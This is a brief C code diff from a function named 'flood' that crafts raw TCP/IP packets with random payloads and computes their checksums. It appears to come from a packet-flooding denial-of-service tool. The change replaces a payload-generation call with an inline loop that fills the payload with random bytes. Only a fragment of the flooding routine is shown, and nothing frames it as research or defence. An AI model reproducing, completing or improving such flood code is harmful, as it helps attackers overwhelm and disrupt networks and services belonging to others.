@@ -815,13 +815,12 @@ void *flood(void *par1)
 	{
 
 		int randomPayloadLength = randnum(32, 512);
-		char *randomPayload = genPayload(randomPayloadLength);
-		/*		char randomPayload[randomPayloadLength];
+		char randomPayload[randomPayloadLength];
 
 		for (int i = 0; i < randomPayloadLength; i++)
 		{
 			randomPayload[i] = rand_cmwc() % 256; // Do not change that bruh
-		}*/
+		}
 		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, randomPayloadLength);
 		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
